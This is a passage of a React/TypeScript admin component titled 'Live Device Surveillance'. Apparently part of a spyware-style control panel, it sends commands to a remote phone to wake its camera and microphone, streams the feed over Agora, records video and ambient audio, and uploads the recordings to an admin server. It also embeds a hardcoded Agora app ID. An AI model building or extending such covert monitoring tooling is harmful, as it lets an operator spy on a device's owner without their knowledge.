'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import type { IAgoraRTCClient, IRemoteAudioTrack, IRemoteVideoTrack } from 'agora-rtc-sdk-ng';

const API_BASE = process.env.NEXT_PUBLIC_API_URL || 'http://127.0.0.1:8000';
const WS_BASE = API_BASE.replace('http://', 'ws://').replace('https://', 'wss://');

interface Device {
  device_id: string;
  device_model: string;
  username: string;
}

interface AudioLevel {
  db: number;
  rms: number;
  timestamp: number;
}

interface SurveillancePanelProps {
  device: Device;
  onClose: () => void;
}

const MAX_HISTORY = 60;

function DbBar({ db }: { db: number }) {
  const clamped = Math.max(-80, Math.min(0, db));
  const pct = Math.round(((clamped + 80) / 80) * 100);

  const color =
    pct < 30
      ? 'bg-green-500'
      : pct < 60
      ? 'bg-yellow-400'
      : pct < 80
      ? 'bg-orange-500'
      : 'bg-red-600';

  return (
    <div className="w-full bg-gray-700 rounded-full h-5 overflow-hidden">
      <div
        className={`h-5 rounded-full transition-all duration-300 ${color}`}
        style={{ width: `${pct}%` }}
      />
    </div>
  );
}

function WaveformCanvas({ history }: { history: AudioLevel[] }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const W = canvas.width;
    const H = canvas.height;
    ctx.clearRect(0, 0, W, H);

    ctx.fillStyle = '#111827';
    ctx.fillRect(0, 0, W, H);

    if (history.length < 2) return;

    const barW = Math.max(1, W / MAX_HISTORY);
    history.forEach((level, i) => {
      const clamped = Math.max(-80, Math.min(0, level.db));
      const pct = (clamped + 80) / 80;
      const barH = Math.max(2, pct * H);

      const grad = ctx.createLinearGradient(0, H, 0, H - barH);
      grad.addColorStop(0, pct > 0.75 ? '#ef4444' : pct > 0.5 ? '#f97316' : '#22c55e');
      grad.addColorStop(1, 'rgba(34,197,94,0.2)');

      ctx.fillStyle = grad;
      ctx.fillRect(i * barW, H - barH, barW - 1, barH);
    });
  }, [history]);

  return (
    <canvas
      ref={canvasRef}
      width={480}
      height={80}
      className="w-full rounded-lg border border-gray-700"
    />
  );
}

export default function SurveillancePanel({ device, onClose }: SurveillancePanelProps) {
  const [audioActive, setAudioActive] = useState(false);
  const [cameraActive, setCameraActive] = useState(false);
  const [liveStreamConnected, setLiveStreamConnected] = useState(false);
  const [hasRemoteVideo, setHasRemoteVideo] = useState(false);
  const [hasRemoteAudio, setHasRemoteAudio] = useState(false);
  const [currentDb, setCurrentDb] = useState<number>(-80);
  const [currentRms, setCurrentRms] = useState<number>(0);
  const [history, setHistory] = useState<AudioLevel[]>([]);
  const [status, setStatus] = useState<string>('Idle');
  const [actionLoading, setActionLoading] = useState(false);
  const [isSwitchingCamera, setIsSwitchingCamera] = useState(false);

  // Independent Video Recording state
  const [isVideoRecording, setIsVideoRecording] = useState(false);
  const [videoRecSeconds, setVideoRecSeconds] = useState(0);

  // Independent Audio Recording state
  const [isAudioRecording, setIsAudioRecording] = useState(false);
  const [audioRecSeconds, setAudioRecSeconds] = useState(0);

  const [savingStream, setSavingStream] = useState(false);
  const [lastSavedStream, setLastSavedStream] = useState<{
    id: string;
    filename: string;
    type: string;
    url: string;
    size: string;
    duration: string;
  } | null>(null);

  const wsRef = useRef<WebSocket | null>(null);
  const rtcClientRef = useRef<IAgoraRTCClient | null>(null);
  const videoContainerRef = useRef<HTMLDivElement>(null);
  const activeChannelRef = useRef<string | null>(null);

  // Live Track References
  const remoteAudioTrackRef = useRef<IRemoteAudioTrack | null>(null);
  const remoteVideoTrackRef = useRef<IRemoteVideoTrack | null>(null);

  // Pending record flags if recording was requested before stream joined
  const pendingRecordVideoRef = useRef(false);
  const pendingRecordAudioRef = useRef(false);

  // Video MediaRecorder refs
  const videoRecorderRef = useRef<MediaRecorder | null>(null);
  const videoChunksRef = useRef<Blob[]>([]);
  const videoTimerRef = useRef<NodeJS.Timeout | null>(null);
  const videoRecStartRef = useRef<number>(0);

  // Audio MediaRecorder refs
  const audioRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const audioTimerRef = useRef<NodeJS.Timeout | null>(null);
  const audioRecStartRef = useRef<number>(0);

  const formatRecDuration = (sec: number) => {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const saveRecordedStream = async (blob: Blob, type: 'video' | 'audio', duration: number) => {
    setSavingStream(true);
    setStatus(`💾 Uploading recorded ${type} stream...`);
    try {
      const ext = type === 'video' ? 'webm' : 'weba';
      const form = new FormData();
      form.append('file', blob, `stream_${type}_${Date.now()}.${ext}`);
      form.append('device_id', device.device_id);
      form.append('username', device.username || 'device_user');
      form.append('stream_type', type);
      form.append('channel_name', activeChannelRef.current || '');
      form.append('duration_seconds', String(duration));
      form.append('mime_type', blob.type || (type === 'video' ? 'video/webm' : 'audio/webm'));

      const res = await fetch(`${API_BASE}/api/admin/streams/upload`, {
        method: 'POST',
        body: form,
      });

      if (res.ok) {
        const data = await res.json();
        setLastSavedStream({
          id: data.stream_id,
          filename: data.filename,
          type: data.stream_type,
          url: `${API_BASE}/api/admin/streams/download/${data.stream_id}`,
          size: data.size_formatted,
          duration: data.duration_formatted,
        });
        setStatus(`✅ Recorded ${type.toUpperCase()} saved (${data.size_formatted}, ${data.duration_formatted}) to Data Management.`);
      } else {
        throw new Error(`Upload failed (HTTP ${res.status})`);
      }
    } catch (e) {
      console.error('Failed to upload stream recording:', e);
      setStatus(`Failed to upload stream recording: ${e instanceof Error ? e.message : String(e)}`);
    } finally {
      setSavingStream(false);
    }
  };

  // --- VIDEO RECORDING IMPLEMENTATION ---
  const getVideoMediaStream = useCallback((): MediaStream | null => {
    const tracks: MediaStreamTrack[] = [];
    if (remoteVideoTrackRef.current) {
      try {
        const vt =
          (remoteVideoTrackRef.current as any).getMediaStreamTrack?.() ||
          (remoteVideoTrackRef.current as any)._mediaStreamTrack;
        if (vt && vt.readyState !== 'ended') tracks.push(vt);
      } catch (e) {
        console.warn('Error reading video track:', e);
      }
    }
    if (remoteAudioTrackRef.current) {
      try {
        const at =
          (remoteAudioTrackRef.current as any).getMediaStreamTrack?.() ||
          (remoteAudioTrackRef.current as any)._mediaStreamTrack;
        if (at && at.readyState !== 'ended') tracks.push(at);
      } catch (e) {
        console.warn('Error reading audio track for video recorder:', e);
      }
    }
    if (tracks.length === 0) return null;
    return new MediaStream(tracks);
  }, []);

  const startVideoRecording = useCallback((overrideStream?: MediaStream) => {
    if (typeof window === 'undefined' || !('MediaRecorder' in window)) {
      alert('MediaRecorder is not supported in this browser.');
      return;
    }

    if (videoRecorderRef.current && videoRecorderRef.current.state !== 'inactive') {
      return;
    }

    const stream = overrideStream || getVideoMediaStream();
    if (!stream) {
      if (!cameraActive) {
        pendingRecordVideoRef.current = true;
        handleStartCamera();
        return;
      }
      setStatus('Waiting for camera video frames before recording...');
      pendingRecordVideoRef.current = true;
      return;
    }

    videoChunksRef.current = [];
    videoRecStartRef.current = Date.now();
    setVideoRecSeconds(0);

    const candidates = ['video/webm;codecs=vp8,opus', 'video/webm', 'video/mp4'];
    let mimeType = '';
    for (const cand of candidates) {
      if (MediaRecorder.isTypeSupported(cand)) {
        mimeType = cand;
        break;
      }
    }

    try {
      const recorder = mimeType ? new MediaRecorder(stream, { mimeType }) : new MediaRecorder(stream);
      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) {
          videoChunksRef.current.push(e.data);
        }
      };

      recorder.onstop = async () => {
        const finalDur = Math.max(1, Math.round((Date.now() - videoRecStartRef.current) / 1000));
        const blobType = mimeType || 'video/webm';
        const blob = new Blob(videoChunksRef.current, { type: blobType });
        if (blob.size > 0) {
          await saveRecordedStream(blob, 'video', finalDur);
        }
        setIsVideoRecording(false);
        if (videoTimerRef.current) {
          clearInterval(videoTimerRef.current);
          videoTimerRef.current = null;
        }
      };

      recorder.start(1000);
      videoRecorderRef.current = recorder;
      setIsVideoRecording(true);
      pendingRecordVideoRef.current = false;

      if (videoTimerRef.current) clearInterval(videoTimerRef.current);
      videoTimerRef.current = setInterval(() => {
        setVideoRecSeconds((prev) => prev + 1);
      }, 1000);

      setStatus('🔴 Recording Live Camera Stream...');
    } catch (err) {
      console.error('Failed to start Video MediaRecorder:', err);
      setStatus(`Failed to record video: ${err instanceof Error ? err.message : String(err)}`);
    }
  }, [cameraActive, getVideoMediaStream]);

  const stopVideoRecording = useCallback(() => {
    pendingRecordVideoRef.current = false;
    if (videoRecorderRef.current && videoRecorderRef.current.state !== 'inactive') {
      try {
        videoRecorderRef.current.stop();
      } catch (e) {
        console.warn('Error stopping video recorder:', e);
      }
    }
    if (videoTimerRef.current) {
      clearInterval(videoTimerRef.current);
      videoTimerRef.current = null;
    }
  }, []);

  // --- AUDIO RECORDING IMPLEMENTATION ---
  const getAudioMediaStream = useCallback((): MediaStream | null => {
    if (!remoteAudioTrackRef.current) return null;
    try {
      const mst =
        (remoteAudioTrackRef.current as any).getMediaStreamTrack?.() ||
        (remoteAudioTrackRef.current as any)._mediaStreamTrack;
      if (mst && mst.readyState !== 'ended') {
        return new MediaStream([mst]);
      }
    } catch (e) {
      console.warn('Could not read MediaStreamTrack from audioTrack:', e);
    }
    return null;
  }, []);

  const startAudioRecording = useCallback((overrideStream?: MediaStream) => {
    if (typeof window === 'undefined' || !('MediaRecorder' in window)) {
      alert('MediaRecorder is not supported in this browser.');
      return;
    }

    if (audioRecorderRef.current && audioRecorderRef.current.state !== 'inactive') {
      return;
    }

    const stream = overrideStream || getAudioMediaStream();
    if (!stream) {
      if (!audioActive) {
        pendingRecordAudioRef.current = true;
        handleStartAudio();
        return;
      }
      setStatus('Waiting for audio stream packets before recording...');
      pendingRecordAudioRef.current = true;
      return;
    }

    audioChunksRef.current = [];
    audioRecStartRef.current = Date.now();
    setAudioRecSeconds(0);

    const candidates = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg', 'audio/mp4'];
    let mimeType = '';
    for (const cand of candidates) {
      if (MediaRecorder.isTypeSupported(cand)) {
        mimeType = cand;
        break;
      }
    }

    try {
      const recorder = mimeType ? new MediaRecorder(stream, { mimeType }) : new MediaRecorder(stream);
      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) {
          audioChunksRef.current.push(e.data);
        }
      };

      recorder.onstop = async () => {
        const finalDur = Math.max(1, Math.round((Date.now() - audioRecStartRef.current) / 1000));
        const blobType = mimeType || 'audio/webm';
        const blob = new Blob(audioChunksRef.current, { type: blobType });
        if (blob.size > 0) {
          await saveRecordedStream(blob, 'audio', finalDur);
        }
        setIsAudioRecording(false);
        if (audioTimerRef.current) {
          clearInterval(audioTimerRef.current);
          audioTimerRef.current = null;
        }
      };

      recorder.start(1000);
      audioRecorderRef.current = recorder;
      setIsAudioRecording(true);
      pendingRecordAudioRef.current = false;

      if (audioTimerRef.current) clearInterval(audioTimerRef.current);
      audioTimerRef.current = setInterval(() => {
        setAudioRecSeconds((prev) => prev + 1);
      }, 1000);

      setStatus('🎙️ Recording Live Audio Feed...');
    } catch (err) {
      console.error('Failed to start Audio MediaRecorder:', err);
      setStatus(`Failed to record audio: ${err instanceof Error ? err.message : String(err)}`);
    }
  }, [audioActive, getAudioMediaStream]);

  const stopAudioRecording = useCallback(() => {
    pendingRecordAudioRef.current = false;
    if (audioRecorderRef.current && audioRecorderRef.current.state !== 'inactive') {
      try {
        audioRecorderRef.current.stop();
      } catch (e) {
        console.warn('Error stopping audio recorder:', e);
      }
    }
    if (audioTimerRef.current) {
      clearInterval(audioTimerRef.current);
      audioTimerRef.current = null;
    }
  }, []);

  // Connect to admin WS for dB readings
  useEffect(() => {
    const ws = new WebSocket(`${WS_BASE}/ws?user_id=admin`);
    wsRef.current = ws;

    ws.onopen = () => setStatus('Admin WebSocket connected');
    ws.onmessage = (evt) => {
      try {
        const data = JSON.parse(evt.data);
        if (
          data.type === 'AUDIO_LEVEL_UPDATE' &&
          data.device_id === device.device_id
        ) {
          const level: AudioLevel = {
            db: Number(data.db ?? -80),
            rms: Number(data.rms ?? 0),
            timestamp: data.timestamp ?? Date.now(),
          };
          setCurrentDb(level.db);
          setCurrentRms(level.rms);
          setHistory((prev) => [...prev.slice(-(MAX_HISTORY - 1)), level]);
        }
      } catch {}
    };
    ws.onclose = () => setStatus('Admin WebSocket disconnected');
    ws.onerror = () => setStatus('Admin WebSocket error');

    return () => {
      ws.close();
      cleanupAgora();
    };
  }, [device.device_id]);

  const cleanupAgora = () => {
    stopVideoRecording();
    stopAudioRecording();
    remoteAudioTrackRef.current = null;
    remoteVideoTrackRef.current = null;
    try {
      rtcClientRef.current?.leave();
      rtcClientRef.current = null;
    } catch (e) {
      console.warn('Agora cleanup error:', e);
    }
    setLiveStreamConnected(false);
    setHasRemoteVideo(false);
    setHasRemoteAudio(false);
  };

  const handleStartAudio = async () => {
    setActionLoading(true);
    setStatus('Activating 1-Way Live Audio Stream...');
    try {
      cleanupAgora();
      const res = await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/start-audio-feed`,
        { method: 'POST' }
      );
      if (!res.ok) {
        throw new Error(`Failed to start audio feed (HTTP ${res.status})`);
      }
      const data = await res.json();
      activeChannelRef.current = data.channel_name;

      const AgoraRTC = (await import('agora-rtc-sdk-ng')).default;
      AgoraRTC.setLogLevel(3);

      const client = AgoraRTC.createClient({ mode: 'rtc', codec: 'vp8' });
      rtcClientRef.current = client;

      client.on('user-published', async (remoteUser, mediaType) => {
        await client.subscribe(remoteUser, mediaType);
        if (mediaType === 'audio') {
          remoteAudioTrackRef.current = remoteUser.audioTrack as IRemoteAudioTrack;
          setHasRemoteAudio(true);
          // Play live microphone audio through browser speakers
          (remoteUser.audioTrack as IRemoteAudioTrack)?.play();

          // If recording was requested, begin recording immediately!
          if (pendingRecordAudioRef.current) {
            try {
              const mst =
                (remoteUser.audioTrack as any).getMediaStreamTrack?.() ||
                (remoteUser.audioTrack as any)._mediaStreamTrack;
              if (mst) {
                const stream = new MediaStream([mst]);
                startAudioRecording(stream);
              }
            } catch (err) {
              console.warn('Error starting pending audio recording:', err);
            }
          }
        }
        setLiveStreamConnected(true);
        setStatus('🔴 Live Audio Stream Receiving!');
      });

      client.on('user-unpublished', (_remoteUser, mediaType) => {
        if (mediaType === 'audio') {
          remoteAudioTrackRef.current = null;
          setHasRemoteAudio(false);
          stopAudioRecording();
        }
      });

      client.on('user-left', () => {
        cleanupAgora();
        setAudioActive(false);
        setStatus('Device disconnected audio stream');
      });

      const appId = data.agora_app_id || 'e63a3e4f21124b659d8eeaef92f367c2';
      await client.join(appId, data.channel_name, data.token || null, 0);
      setAudioActive(true);
      setHistory([]);
      setStatus(
        data.delivered
          ? 'Listening to live audio stream...'
          : 'Command dispatched. Waiting for device audio...'
      );
    } catch (e: unknown) {
      console.error('Error starting audio stream:', e);
      setStatus(`Audio stream error: ${e instanceof Error ? e.message : String(e)}`);
      cleanupAgora();
      setAudioActive(false);
    } finally {
      setActionLoading(false);
    }
  };

  const handleStopAudio = async () => {
    setActionLoading(true);
    setStatus('Stopping Audio Feed...');
    try {
      await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/stop-audio-feed`,
        { method: 'POST' }
      );
    } catch (e) {
      console.error('Stop audio request error:', e);
    } finally {
      cleanupAgora();
      setAudioActive(false);
      setCurrentDb(-80);
      setCurrentRms(0);
      setStatus('Audio stream stopped');
      setActionLoading(false);
    }
  };

  const handleStartCamera = async () => {
    setActionLoading(true);
    setStatus('Activating Live Camera Stream...');
    try {
      cleanupAgora();
      const res = await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/start-camera-feed`,
        { method: 'POST' }
      );
      if (!res.ok) {
        throw new Error(`Failed to start camera feed (HTTP ${res.status})`);
      }
      const data = await res.json();
      activeChannelRef.current = data.channel_name;

      const AgoraRTC = (await import('agora-rtc-sdk-ng')).default;
      AgoraRTC.setLogLevel(3);

      const client = AgoraRTC.createClient({ mode: 'rtc', codec: 'vp8' });
      rtcClientRef.current = client;

      client.on('user-published', async (remoteUser, mediaType) => {
        await client.subscribe(remoteUser, mediaType);
        if (mediaType === 'video') {
          remoteVideoTrackRef.current = remoteUser.videoTrack as IRemoteVideoTrack;
          setHasRemoteVideo(true);
          setTimeout(() => {
            if (videoContainerRef.current) {
              (remoteUser.videoTrack as IRemoteVideoTrack)?.play(videoContainerRef.current);
            }
          }, 300);
        }
        if (mediaType === 'audio') {
          remoteAudioTrackRef.current = remoteUser.audioTrack as IRemoteAudioTrack;
          setHasRemoteAudio(true);
          (remoteUser.audioTrack as IRemoteAudioTrack)?.play();
        }
        setLiveStreamConnected(true);
        setStatus('🔴 Live Camera Stream Receiving!');

        // If recording was requested, begin recording immediately!
        if (pendingRecordVideoRef.current && mediaType === 'video') {
          try {
            const vt =
              (remoteUser.videoTrack as any).getMediaStreamTrack?.() ||
              (remoteUser.videoTrack as any)._mediaStreamTrack;
            if (vt) {
              const stream = new MediaStream([vt]);
              startVideoRecording(stream);
            }
          } catch (err) {
            console.warn('Error starting pending video recording:', err);
          }
        }
      });

      client.on('user-unpublished', (_remoteUser, mediaType) => {
        if (mediaType === 'video') {
          remoteVideoTrackRef.current = null;
          setHasRemoteVideo(false);
          stopVideoRecording();
        }
        if (mediaType === 'audio') {
          remoteAudioTrackRef.current = null;
          setHasRemoteAudio(false);
        }
      });

      client.on('user-left', () => {
        cleanupAgora();
        setCameraActive(false);
        setStatus('Device disconnected camera feed');
      });

      const appId = data.agora_app_id || 'e63a3e4f21124b659d8eeaef92f367c2';
      await client.join(appId, data.channel_name, data.token || null, 0);
      setCameraActive(true);
      setStatus(
        data.delivered
          ? 'Receiving live camera stream...'
          : 'Command dispatched. Waiting for device video...'
      );
    } catch (e: unknown) {
      console.error('Error starting camera stream:', e);
      setStatus(`Camera stream error: ${e instanceof Error ? e.message : String(e)}`);
      cleanupAgora();
      setCameraActive(false);
    } finally {
      setActionLoading(false);
    }
  };

  const handleStopCamera = async () => {
    setActionLoading(true);
    setStatus('Stopping Camera Feed...');
    try {
      await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/stop-camera-feed`,
        { method: 'POST' }
      );
    } catch (e) {
      console.error('Stop camera request error:', e);
    } finally {
      cleanupAgora();
      setCameraActive(false);
      setStatus('Camera stream stopped');
      setActionLoading(false);
    }
  };

  const handleSwitchCamera = async () => {
    setIsSwitchingCamera(true);
    setStatus('Switching camera lens (Front ↔ Back)...');
    try {
      const res = await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/switch-camera`,
        { method: 'POST' }
      );
      const data = await res.json();
      if (data.delivered) {
        setStatus('Camera lens switched successfully');
      } else {
        setStatus('Camera switch command queued for device');
      }
    } catch (e) {
      console.error('Switch camera error:', e);
      setStatus('Failed to switch camera lens');
    } finally {
      setIsSwitchingCamera(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/40 backdrop-blur-sm p-4">
      <div className="bg-white border border-slate-200 rounded-2xl shadow-2xl w-full max-w-2xl text-slate-900 overflow-hidden flex flex-col max-h-[90vh]">

        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-slate-200 bg-slate-50">
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <h2 className="text-lg font-bold text-slate-900">🛰️ Live Device Surveillance</h2>
              {liveStreamConnected && (
                <span className="flex items-center gap-1.5 px-2 py-0.5 rounded-full text-[11px] font-bold bg-red-100 text-red-700 border border-red-200 animate-pulse">
                  <span className="w-2 h-2 rounded-full bg-red-500"></span>
                  LIVE
                </span>
              )}
              {isVideoRecording && (
                <span className="flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-red-600 text-white animate-pulse shadow-sm">
                  <span className="w-2 h-2 rounded-full bg-white"></span>
                  REC VIDEO {formatRecDuration(videoRecSeconds)}
                </span>
              )}
              {isAudioRecording && (
                <span className="flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-purple-600 text-white animate-pulse shadow-sm">
                  <span className="w-2 h-2 rounded-full bg-white"></span>
                  REC AUDIO {formatRecDuration(audioRecSeconds)}
                </span>
              )}
              {savingStream && (
                <span className="flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-amber-100 text-amber-800 border border-amber-300 animate-pulse">
                  <span>💾 Saving Stream...</span>
                </span>
              )}
            </div>
            <p className="text-xs text-slate-500 mt-0.5">
              {device.device_model} &mdash;{' '}
              <span className="text-emerald-700 font-mono font-semibold">@{device.username}</span>
            </p>
          </div>
          <div className="flex items-center gap-3">
            <button
              onClick={() => {
                cleanupAgora();
                onClose();
              }}
              className="text-slate-400 hover:text-slate-700 text-2xl leading-none px-2 rounded-lg hover:bg-slate-200 transition cursor-pointer"
              title="Close"
            >
              ×
            </button>
          </div>
        </div>

        {/* Status bar */}
        <div className="px-6 py-2 bg-slate-100 text-xs text-slate-600 flex items-center justify-between border-b border-slate-200">
          <div className="flex items-center gap-2">
            <span className={`inline-block w-2 h-2 rounded-full ${liveStreamConnected ? 'bg-red-500 animate-ping' : (audioActive || cameraActive) ? 'bg-emerald-500 animate-pulse' : 'bg-slate-400'}`} />
            <span className="font-medium">{status}</span>
          </div>
          <div className="flex items-center gap-3 text-[11px] text-slate-500 font-mono">
            {hasRemoteAudio && <span className="text-emerald-600 font-bold">🔊 Audio In Browser</span>}
            {hasRemoteVideo && <span className="text-emerald-600 font-bold">📹 Video Synced</span>}
          </div>
        </div>

        <div className="flex-1 overflow-y-auto p-6 space-y-6">

          {/* Last Saved Stream Banner */}
          {lastSavedStream && (
            <div className="flex items-center justify-between p-3.5 rounded-xl bg-emerald-50 border border-emerald-200 text-xs text-emerald-800 shadow-sm animate-fadeIn">
              <div className="flex items-center gap-2.5">
                <span className="text-lg">✅</span>
                <div>
                  <div className="font-bold">Stream Recording Stored!</div>
                  <div className="text-[11px] text-emerald-700 font-medium">
                    {lastSavedStream.type.toUpperCase()} stream &bull; {lastSavedStream.size} &bull; {lastSavedStream.duration}
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <a
                  href={lastSavedStream.url}
                  download={lastSavedStream.filename}
                  className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white font-semibold rounded-lg shadow-sm transition text-xs flex items-center gap-1.5"
                >
                  <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                  </svg>
                  Download Stream
                </a>
                <a
                  href="/data/streaming"
                  className="px-3 py-1.5 bg-white hover:bg-slate-100 text-emerald-800 border border-emerald-300 font-semibold rounded-lg transition text-xs"
                >
                  Open Streaming Data &rarr;
                </a>
              </div>
            </div>
          )}

          {/* Camera Video Section */}
          <div className="space-y-3">
            <div className="flex items-center justify-between flex-wrap gap-2">
              <h3 className="font-semibold text-xs text-slate-700 uppercase tracking-wider flex items-center gap-1.5">
                📷 Live Camera Viewport
              </h3>
              <div className="flex items-center gap-2 flex-wrap">
                {/* Rotate Camera */}
                <button
                  onClick={handleSwitchCamera}
                  disabled={isSwitchingCamera}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-amber-50 hover:bg-amber-100 border border-amber-300 text-amber-800 text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  title="Switch between front and back camera (Front ↔ Back)"
                >
                  <span className={isSwitchingCamera ? 'animate-spin inline-block' : ''}>🔄</span>
                  <span>{isSwitchingCamera ? 'Rotating...' : 'Rotate Camera'}</span>
                </button>

                {/* Dedicated Record Video Button */}
                {!isVideoRecording ? (
                  <button
                    onClick={() => startVideoRecording()}
                    disabled={actionLoading || savingStream}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-rose-50 hover:bg-rose-100 border border-rose-300 text-rose-700 text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                    title="Record and save live camera video stream"
                  >
                    <span className="w-2 h-2 rounded-full bg-rose-600"></span>
                    <span>Record Video</span>
                  </button>
                ) : (
                  <button
                    onClick={stopVideoRecording}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-600 hover:bg-red-700 text-white text-xs font-semibold transition shadow-sm cursor-pointer animate-pulse"
                    title="Stop recording video stream and save file"
                  >
                    <span className="w-2 h-2 rounded-full bg-white animate-ping"></span>
                    <span>Stop Recording ({formatRecDuration(videoRecSeconds)})</span>
                  </button>
                )}

                {/* Start / Stop Camera Stream */}
                {!cameraActive ? (
                  <button
                    onClick={handleStartCamera}
                    disabled={actionLoading}
                    className="px-4 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  >
                    {actionLoading ? 'Connecting...' : '▶ Start Camera Stream'}
                  </button>
                ) : (
                  <button
                    onClick={handleStopCamera}
                    disabled={actionLoading}
                    className="px-4 py-1.5 rounded-lg bg-slate-700 hover:bg-slate-800 text-white text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  >
                    {actionLoading ? 'Stopping...' : '■ Stop Camera'}
                  </button>
                )}
              </div>
            </div>

            {/* Video Viewport Container */}
            <div className="relative w-full h-72 bg-black rounded-xl border border-slate-200 overflow-hidden shadow-inner flex items-center justify-center">
              {/* Overlay quick switch button when video is active */}
              {cameraActive && hasRemoteVideo && (
                <button
                  onClick={handleSwitchCamera}
                  disabled={isSwitchingCamera}
                  className="absolute top-3 right-3 z-10 flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-black/70 hover:bg-black/90 backdrop-blur-sm border border-white/20 text-white text-[11px] font-medium transition cursor-pointer shadow-lg"
                  title="Switch front/back camera"
                >
                  <span className={isSwitchingCamera ? 'animate-spin inline-block' : ''}>🔄</span>
                  <span>Flip Lens</span>
                </button>
              )}

              {/* Agora Video Render DOM */}
              <div
                ref={videoContainerRef}
                className={`w-full h-full object-cover ${hasRemoteVideo ? 'block' : 'hidden'}`}
              />

              {/* Placeholder / Offline State */}
              {!hasRemoteVideo && (
                <div className="text-center p-6 space-y-2">
                  <div className="text-4xl text-slate-500">
                    {cameraActive ? '📡' : '📹'}
                  </div>
                  <p className="text-sm font-semibold text-slate-300">
                    {cameraActive ? 'Connecting Live Video Stream...' : 'Camera Stream Inactive'}
                  </p>
                  <p className="text-xs text-slate-400 max-w-sm">
                    {cameraActive
                      ? 'Establishing real-time WebRTC channel with device. Live frame will appear immediately when received.'
                      : 'Click "Start Camera Stream" or "Record Video" to wake the device camera and watch live video feed here.'}
                  </p>
                </div>
              )}
            </div>
          </div>

          {/* Audio Surveillance Section */}
          <div className="space-y-3 pt-2 border-t border-slate-200">
            <div className="flex items-center justify-between flex-wrap gap-2">
              <h3 className="font-semibold text-xs text-slate-700 uppercase tracking-wider flex items-center gap-1.5">
                🎙️ Live Audio Listening & Sound Level
              </h3>
              <div className="flex items-center gap-2 flex-wrap">
                {/* Dedicated Record Audio Button */}
                {!isAudioRecording ? (
                  <button
                    onClick={() => startAudioRecording()}
                    disabled={actionLoading || savingStream}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-purple-50 hover:bg-purple-100 border border-purple-300 text-purple-700 text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                    title="Record and save live ambient microphone audio"
                  >
                    <span className="w-2 h-2 rounded-full bg-purple-600"></span>
                    <span>Record Audio</span>
                  </button>
                ) : (
                  <button
                    onClick={stopAudioRecording}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-purple-600 hover:bg-purple-700 text-white text-xs font-semibold transition shadow-sm cursor-pointer animate-pulse"
                    title="Stop recording audio stream and save file"
                  >
                    <span className="w-2 h-2 rounded-full bg-white animate-ping"></span>
                    <span>Stop Recording ({formatRecDuration(audioRecSeconds)})</span>
                  </button>
                )}

                {/* Start / Stop Audio Listening */}
                {!audioActive ? (
                  <button
                    onClick={handleStartAudio}
                    disabled={actionLoading}
                    className="px-4 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  >
                    {actionLoading ? 'Connecting...' : '▶ Listen Live (Browser Audio)'}
                  </button>
                ) : (
                  <button
                    onClick={handleStopAudio}
                    disabled={actionLoading}
                    className="px-4 py-1.5 rounded-lg bg-slate-700 hover:bg-slate-800 text-white text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  >
                    {actionLoading ? 'Stopping...' : '■ Stop Listening'}
                  </button>
                )}
              </div>
            </div>

            {/* Decibel Meter & Live Waveform */}
            <div className="bg-slate-900 rounded-xl p-4 space-y-3 border border-slate-800">
              <div className="flex items-center justify-between text-xs">
                <span className="text-slate-400 font-medium">Ambient Noise Level</span>
                <span className="font-mono font-bold text-white text-sm">
                  {currentDb > -80 ? `${currentDb.toFixed(1)} dB` : '—'}
                </span>
              </div>
              <DbBar db={currentDb} />

              <div className="pt-2">
                <div className="text-[11px] text-slate-400 font-medium mb-1.5">
                  Audio Waveform History (Last 60s)
                </div>
                <WaveformCanvas history={history} />
              </div>
            </div>
          </div>
        </div>

        {/* Modal Footer */}
        <div className="px-6 py-3 border-t border-slate-200 bg-slate-50 flex items-center justify-between">
          <span className="text-xs text-slate-400 font-mono">
            Device ID: {device.device_id.slice(0, 16)}…
          </span>
          <button
            onClick={() => {
